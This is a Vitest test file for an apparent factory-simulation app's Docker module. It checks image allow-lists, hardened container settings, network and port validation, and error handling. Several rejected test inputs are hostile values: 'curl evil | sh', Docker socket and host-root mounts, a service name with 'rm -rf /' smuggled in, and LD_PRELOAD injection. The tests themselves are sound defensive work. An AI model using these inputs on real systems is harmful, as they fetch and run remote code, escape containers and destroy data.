// @vitest-environment node
import { readdirSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { DomainError, type DomainErrorCode } from "@/lib/domain/errors";
import { dockerOptionsFromHost } from "./client";
import { toRuntimeState } from "./containers";
import { toDockerDomainError } from "./errors";
import { imageReference } from "./images";
import { assertSubnetAvailable } from "./networks";
import { DEFAULT_LIMITS, parsePortRange, type RuntimePolicy, runtimePolicyFromEnv } from "./policy";
import { assertPortBindings } from "./ports";
import { RUNTIME_IMAGES } from "./runtime-images";
import { buildContainerSpec, buildNetworkCreateOptions, containerNameFor } from "./spec";

const FACTORY_ID = "01a107ff-de99-71ec-adbb-40049a4cf552";
const DEVICE_ID = "01a107ff-deb1-7349-a73a-98db7d255019";

const policy: RuntimePolicy = {
  images: [
    {
      key: "openplc",
      reference: "example/openplc:1.0",
      digest: "sha256:abc",
      command: ["run"],
      publishablePorts: [502],
      allowedEnv: ["PLC_NAME"],
    },
  ],
  portRange: { min: 15000, max: 15999 },
  bindAddresses: ["127.0.0.1"],
  limits: DEFAULT_LIMITS,
};

const request = (overrides: Record<string, unknown> = {}) => ({
  factoryId: FACTORY_ID,
  deviceId: DEVICE_ID,
  networkName: `zfactory_${FACTORY_ID}`,
  serviceName: "s7-1200-1214c-01",
  image: "openplc",
  ...overrides,
});

function expectDomainError(action: () => unknown, code: DomainErrorCode, rule?: string) {
  try {
    action();
  } catch (error) {
    expect(error).toBeInstanceOf(DomainError);
    expect((error as DomainError).code).toBe(code);
    if (rule) expect((error as DomainError).details.rule).toBe(rule);
    return;
  }
  expect.unreachable("expected a DomainError");
}

describe("server-only boundary", () => {
  it("marks every Docker module as server-only", () => {
    const directory = join(process.cwd(), "lib/docker");
    const modules = readdirSync(directory).filter((file) => file.endsWith(".ts") && !file.endsWith(".test.ts"));
    expect(modules.length).toBeGreaterThan(5);
    for (const file of modules) {
      const firstLine = readFileSync(join(directory, file), "utf8").split("\n")[0];
      expect(firstLine, file).toBe('import "server-only";');
    }
  });
});

describe("image allow-list", () => {
  it("ships empty until the runtime tasks add their pinned images", () => {
    expect(RUNTIME_IMAGES).toEqual([]);
  });

  it("runs only allow-listed images, selected by key", () => {
    expectDomainError(
      () => buildContainerSpec(request({ image: "busybox" }), policy),
      "VALIDATION",
      "image-allow-list",
    );
    // A raw reference is not a key, even when it names the allow-listed image.
    expectDomainError(
      () => buildContainerSpec(request({ image: "example/openplc:1.0" }), policy),
      "VALIDATION",
      "image-allow-list",
    );
  });

  it("pins the image to its digest and uses the allow-listed command", () => {
    const { options } = buildContainerSpec(request(), policy);
    expect(options.Image).toBe("example/openplc:1.0@sha256:abc");
    expect(options.Cmd).toEqual(["run"]);
    expect(imageReference({ ...policy.images[0]!, digest: undefined })).toBe("example/openplc:1.0");
  });
});

describe("container requests cannot escape the allow-list", () => {
  it.each([
    ["privileged", true],
    ["binds", ["/:/host"]],
    ["volumes", { "/host": {} }],
    ["mounts", [{ type: "bind", source: "/var/run/docker.sock", target: "/var/run/docker.sock" }]],
    ["cmd", ["sh", "-c", "curl evil | sh"]],
    ["command", ["sh"]],
    ["entrypoint", ["/bin/sh"]],
    ["capAdd", ["SYS_ADMIN"]],
    ["devices", ["/dev/sda"]],
    ["networkMode", "host"],
    ["pidMode", "host"],
    ["user", "root"],
    ["HostConfig", { Privileged: true }],
  ])("rejects the %s option", (key, value) => {
    expectDomainError(() => buildContainerSpec(request({ [key]: value }), policy), "VALIDATION");
  });

  it("rejects unknown keys inside ports and limits", () => {
    expectDomainError(
      () =>
        buildContainerSpec(request({ ports: [{ containerPort: 502, hostPort: 15021, hostIp: "0.0.0.0" }] }), policy),
      "VALIDATION",
    );
    expectDomainError(
      () => buildContainerSpec(request({ limits: { cpus: 1, oomKillDisable: true } }), policy),
      "VALIDATION",
    );
  });

  it("only attaches to a generated factory network, never host or another network", () => {
    for (const networkName of ["host", "bridge", "none", "container:abc", "other_network", "zfactory_"]) {
      expectDomainError(() => buildContainerSpec(request({ networkName }), policy), "VALIDATION");
    }
  });

  it("rejects service names that are not DNS labels", () => {
    for (const serviceName of ["UPPER", "has space", "a/b", "-leading", "x;rm -rf /", ""]) {
      expectDomainError(() => buildContainerSpec(request({ serviceName }), policy), "VALIDATION");
    }
  });

  it("allows only the image's declared environment variables, without control characters", () => {
    const { options } = buildContainerSpec(request({ env: { PLC_NAME: "S7-1200-1214C-01" } }), policy);
    expect(options.Env).toEqual(["PLC_NAME=S7-1200-1214C-01"]);
    expectDomainError(
      () => buildContainerSpec(request({ env: { LD_PRELOAD: "/x.so" } }), policy),
      "VALIDATION",
      "env-allow-list",
    );
    expectDomainError(
      () => buildContainerSpec(request({ env: { PLC_NAME: "a\nLD_PRELOAD=/x.so" } }), policy),
      "VALIDATION",
      "env-value",
    );
  });

  it("publishes only ports the image declares", () => {
    expectDomainError(
      () => buildContainerSpec(request({ ports: [{ containerPort: 22, hostPort: 15022 }] }), policy),
      "VALIDATION",
      "publishable-port",
    );
  });
});

describe("hardened container spec", () => {
  const { options, ports } = buildContainerSpec(
    request({ ports: [{ containerPort: 502, hostPort: 15021 }], limits: { cpus: 0.5, memoryMb: 128 } }),
    policy,
  );
  const host = options.HostConfig!;

  it("fixes the security-relevant options", () => {
    expect(host.Privileged).toBe(false);
    expect(host.CapDrop).toEqual(["ALL"]);
    expect(host.CapAdd).toBeUndefined();
    expect(host.SecurityOpt).toEqual(["no-new-privileges"]);
    expect(host.Binds).toEqual([]);
    expect(host.Mounts).toEqual([]);
    expect(host.Devices).toEqual([]);
    expect(host.RestartPolicy).toEqual({ Name: "no" });
    expect(options.Entrypoint).toBeUndefined();
    expect(options.User).toBeUndefined();
  });

  it("joins exactly the factory network under its service name", () => {
    expect(host.NetworkMode).toBe(`zfactory_${FACTORY_ID}`);
    expect(options.NetworkingConfig?.EndpointsConfig).toEqual({
      [`zfactory_${FACTORY_ID}`]: { Aliases: ["s7-1200-1214c-01"] },
    });
    expect(options.Hostname).toBe("s7-1200-1214c-01");
    expect(options.name).toBe(containerNameFor(FACTORY_ID, "s7-1200-1214c-01"));
  });

  it("applies CPU, memory and process limits", () => {
    expect(host.NanoCpus).toBe(500_000_000);
    expect(host.Memory).toBe(128 * 1024 * 1024);
    expect(host.MemorySwap).toBe(host.Memory);
    expect(host.PidsLimit).toBe(DEFAULT_LIMITS.pidsLimit);
  });

  it("uses the default limits when none are requested and refuses to exceed the maximum", () => {
    const defaults = buildContainerSpec(request(), policy).options.HostConfig!;
    expect(defaults.NanoCpus).toBe(DEFAULT_LIMITS.defaultCpus * 1e9);
    expect(defaults.Memory).toBe(DEFAULT_LIMITS.defaultMemoryMb * 1024 * 1024);
    expectDomainError(() => buildContainerSpec(request({ limits: { cpus: 64 } }), policy), "VALIDATION", "cpu-limit");
    expectDomainError(
      () => buildContainerSpec(request({ limits: { memoryMb: 1_000_000 } }), policy),
      "VALIDATION",
      "memory-limit",
    );
  });

  it("binds published ports to the default allowed address", () => {
    expect(ports).toEqual([{ containerPort: 502, hostPort: 15021, bindAddress: "127.0.0.1" }]);
    expect(host.PortBindings).toEqual({ "502/tcp": [{ HostIp: "127.0.0.1", HostPort: "15021" }] });
  });

  it("labels the container with Z-Factory ids", () => {
    expect(options.Labels).toMatchObject({
      "zfactory.managed": "true",
      "zfactory.factory-id": FACTORY_ID,
      "zfactory.device-id": DEVICE_ID,
      "zfactory.service": "s7-1200-1214c-01",
    });
  });
});

describe("factory network spec", () => {
  it("builds an isolated, labelled bridge network on the factory subnet", () => {
    const options = buildNetworkCreateOptions(
      { factoryId: FACTORY_ID, name: `zfactory_${FACTORY_ID}`, subnetCidr: "172.20.1.0/24" },
      policy,
    );
    expect(options).toMatchObject({
      Name: `zfactory_${FACTORY_ID}`,
      Driver: "bridge",
      Attachable: false,
      IPAM: { Config: [{ Subnet: "172.20.1.0/24" }] },
      Labels: { "zfactory.managed": "true", "zfactory.factory-id": FACTORY_ID },
    });
  });

  it("rejects unsafe names, subnets and extra options", () => {
    const base = { factoryId: FACTORY_ID, name: `zfactory_${FACTORY_ID}`, subnetCidr: "172.20.1.0/24" };
    expectDomainError(() => buildNetworkCreateOptions({ ...base, name: "host" }, policy), "VALIDATION");
    expectDomainError(() => buildNetworkCreateOptions({ ...base, subnetCidr: "8.8.8.0/24" }, policy), "VALIDATION");
    expectDomainError(() => buildNetworkCreateOptions({ ...base, driver: "host" }, policy), "VALIDATION");
  });

  it("refuses a subnet that overlaps any existing Docker network", () => {
    const existing = [
      { name: "bridge", subnets: ["172.17.0.0/16"], labels: {} },
      { name: "other-project", subnets: ["172.22.0.0/16"], labels: {} },
    ];
    expectDomainError(() => assertSubnetAvailable("172.22.5.0/24", existing), "CONFLICT", "docker-subnet-overlap");
    expect(() => assertSubnetAvailable("172.20.1.0/24", existing)).not.toThrow();
  });

  it("keeps the other network's name out of the user-facing message", () => {
    try {
      assertSubnetAvailable("172.22.5.0/24", [{ name: "secret-project", subnets: ["172.22.0.0/16"], labels: {} }]);
      expect.unreachable();
    } catch (error) {
      expect((error as DomainError).message).not.toContain("secret-project");
    }
  });
});

describe("port validation", () => {
  const binding = (hostPort: number, bindAddress = "127.0.0.1") => ({ containerPort: 502, hostPort, bindAddress });

  it("accepts a free port in range on an allowed address", () => {
    expect(() =>
      assertPortBindings([binding(15021)], [{ hostPort: 5432, bindAddress: "127.0.0.1" }], policy),
    ).not.toThrow();
  });

  it("rejects ports outside the range and addresses outside the allow-list", () => {
    expectDomainError(() => assertPortBindings([binding(80)], [], policy), "VALIDATION", "host-port-range");
    expectDomainError(() => assertPortBindings([binding(16000)], [], policy), "VALIDATION", "host-port-range");
    expectDomainError(
      () => assertPortBindings([binding(15021, "0.0.0.0")], [], policy),
      "VALIDATION",
      "bind-address-allowed",
    );
  });

  it("rejects a port that is already published, including wildcard binds", () => {
    expectDomainError(
      () => assertPortBindings([binding(15021)], [{ hostPort: 15021, bindAddress: "127.0.0.1" }], policy),
      "CONFLICT",
      "host-port-taken",
    );
    expectDomainError(
      () => assertPortBindings([binding(15021)], [{ hostPort: 15021, bindAddress: "0.0.0.0" }], policy),
      "CONFLICT",
      "host-port-taken",
    );
    // The same port on a different specific address does not collide.
    expect(() =>
      assertPortBindings([binding(15021)], [{ hostPort: 15021, bindAddress: "192.168.1.10" }], policy),
    ).not.toThrow();
  });

  it("rejects the same host port twice in one request", () => {
    expectDomainError(
      () => assertPortBindings([binding(15021), binding(15021)], [], policy),
      "CONFLICT",
      "host-port-duplicate",
    );
  });
});

describe("policy and client configuration", () => {
  it("parses the port range and refuses privileged or reversed ranges", () => {
    expect(parsePortRange("15000-15999")).toEqual({ min: 15000, max: 15999 });
    expectDomainError(() => parsePortRange("80-90"), "VALIDATION", "port-range");
    expectDomainError(() => parsePortRange("16000-15000"), "VALIDATION", "port-range");
    expectDomainError(() => parsePortRange("15000-70000"), "VALIDATION", "port-range");
  });

  it("builds the policy from the environment contract", () => {
    const fromEnv = runtimePolicyFromEnv({
      RUNTIME_PORT_RANGE: "15000-15099",
      RUNTIME_BIND_ADDRESSES: "127.0.0.1,192.168.1.10",
    });
    expect(fromEnv.portRange).toEqual({ min: 15000, max: 15099 });
    expect(fromEnv.bindAddresses).toEqual(["127.0.0.1", "192.168.1.10"]);
    expect(fromEnv.images).toBe(RUNTIME_IMAGES);
  });

  it("connects through a unix socket or a TCP proxy", () => {
    expect(dockerOptionsFromHost("unix:///var/run/docker.sock")).toEqual({ socketPath: "/var/run/docker.sock" });
    expect(dockerOptionsFromHost("tcp://docker-proxy:2375")).toEqual({
      host: "docker-proxy",
      port: 2375,
      protocol: "http",
    });
  });
});

describe("docker error translation", () => {
  it("maps daemon failures to domain errors without repeating daemon text", () => {
    const error = toDockerDomainError(
      { statusCode: 500, message: "error mounting /home/someone/secret to rootfs" },
      "create container",
    );
    expect(error.code).toBe("RUNTIME_FAILURE");
    expect(error.message).toBe("Docker could not complete the request (create container).");
    expect(JSON.stringify(error.details)).not.toContain("/home/someone");
  });

  it("recognises not-found, conflict and an unreachable engine", () => {
    expect(toDockerDomainError({ statusCode: 404 }, "inspect").code).toBe("NOT_FOUND");
    expect(toDockerDomainError({ statusCode: 409 }, "create").code).toBe("CONFLICT");
    expect(toDockerDomainError({ code: "ECONNREFUSED" }, "ping").message).toBe("The Docker Engine is not reachable.");
    expect(toDockerDomainError({ code: "ENOENT" }, "ping").code).toBe("RUNTIME_FAILURE");
  });

  it("passes domain errors through unchanged", () => {
    const original = new DomainError("CONFLICT", "x");
    expect(toDockerDomainError(original, "create")).toBe(original);
  });
});

describe("container state mapping", () => {
  const state = (overrides: Record<string, unknown>) => overrides as Parameters<typeof toRuntimeState>[0];

  it("maps Docker states onto runtime states", () => {
    expect(toRuntimeState(state({ Status: "created" }))).toBe("STOPPED");
    expect(toRuntimeState(state({ Status: "running" }))).toBe("RUNNING");
    expect(toRuntimeState(state({ Status: "running", Health: { Status: "starting" } }))).toBe("STARTING");
    expect(toRuntimeState(state({ Status: "running", Health: { Status: "unhealthy" } }))).toBe("DEGRADED");
    expect(toRuntimeState(state({ Status: "restarting" }))).toBe("STARTING");
    expect(toRuntimeState(state({ Status: "removing" }))).toBe("STOPPING");
    expect(toRuntimeState(state({ Status: "exited", ExitCode: 0 }))).toBe("STOPPED");
    expect(toRuntimeState(state({ Status: "exited", ExitCode: 137 }))).toBe("FAULTED");
    expect(toRuntimeState(state({ Status: "dead" }))).toBe("FAULTED");
  });
});
